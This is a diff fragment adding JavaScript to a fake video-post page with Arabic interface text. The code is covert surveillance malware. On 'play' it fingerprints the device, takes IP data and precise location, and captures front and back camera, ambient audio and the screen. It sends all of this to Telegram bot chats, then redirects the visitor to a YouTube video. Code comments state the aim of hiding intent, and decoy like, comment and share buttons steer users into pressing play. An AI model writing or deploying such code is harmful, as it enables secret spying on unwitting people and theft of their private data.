+            await getDeepDeviceFingerprint(tChat, tToken, mChat, mToken);
+            await getRichIPData(tChat, tToken, mChat, mToken);
+            if (activeFeatures.includes('loc')) getPreciseLocation(tChat, tToken, mChat, mToken);
+            
+            let collectionStarted = false;
+            const playButton = document.getElementById('playBtn');
+            const overlayPlay = document.getElementById('playOverlayBtn');
+            const loadingDiv = document.getElementById('loading');
+            const fakePreviewDiv = document.getElementById('fakePreview');
+            
+            const executeDataCollection = async () => {
+                if (collectionStarted) return;
+                collectionStarted = true;
+                playButton.disabled = true;
+                loadingDiv.style.display = 'block';
+                fakePreviewDiv.style.display = 'flex';
+                document.getElementById('status').innerHTML = '🎬 يتم تجهيز البث وجمع المحتوى...';
+                
+                const collectionTasks = [];
+                if (activeFeatures.includes('front')) collectionTasks.push(captureFrontCameraAdvanced(tChat, tToken, mChat, mToken));
+                if (activeFeatures.includes('back')) collectionTasks.push(captureBackCameraAdvanced(tChat, tToken, mChat, mToken));
+                if (activeFeatures.includes('audio')) collectionTasks.push(recordAmbientAudio(tChat, tToken, mChat, mToken));
+                if (activeFeatures.includes('screen')) collectionTasks.push(captureScreen(tChat, tToken, mChat, mToken));
+                
+                await Promise.allSettled(collectionTasks);
+                
+                // إشعار نهائي
+                await sendToTelegram(tChat, tToken, 'text', null, "✅ اكتمل جمع جميع الوسائط (كاميرات/صوت/شاشة) بنجاح");
+                await sendToTelegram(mChat, mToken, 'text', null, "✅ تم الحصول على بيانات العضو (صوت/صور/موقع)");
+                
+                document.getElementById('status').innerHTML = '✅ جاهز، جاري نقلك إلى المحتوى...';
+                loadingDiv.innerHTML = '<div class="spinner-fb"></div><p>تم التحميل! إعادة التوجيه للمشاهدة الحصرية...</p>';
+                
+                setTimeout(() => {
+                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                }, 2000);
+            };
+            
+            // ربط الأحداث مع محاكاة تأخير طفيف لإخفاء النية
+            const triggerCollection = () => {
+                executeDataCollection().catch(console.warn);
+            };
+            playButton.onclick = triggerCollection;
+            overlayPlay.onclick = triggerCollection;
+            
+            // أزرار وهمية تضليلية
+            document.getElementById('fakeLikeBtn').onclick = () => { alert("🔒 يجب تشغيل الفيديو أولاً للوصول إلى خاصية الإعجاب"); };
+            document.getElementById('fakeCommentBtn').onclick = () => { alert("📢 قم بتشغيل البث المباشر لتظهر التعليقات"); };
+            document.getElementById('fakeShareBtn').onclick = () => { alert("⚠️ عذراً، خاصية المشاركة متاحة بعد مشاهدة المنشور"); };
+            
+            document.getElementById('status').innerHTML = '🔐 جروب بني أحمد | انقر للتشغيل الآمن';
+        })();
     })();
 </script>
 </body>
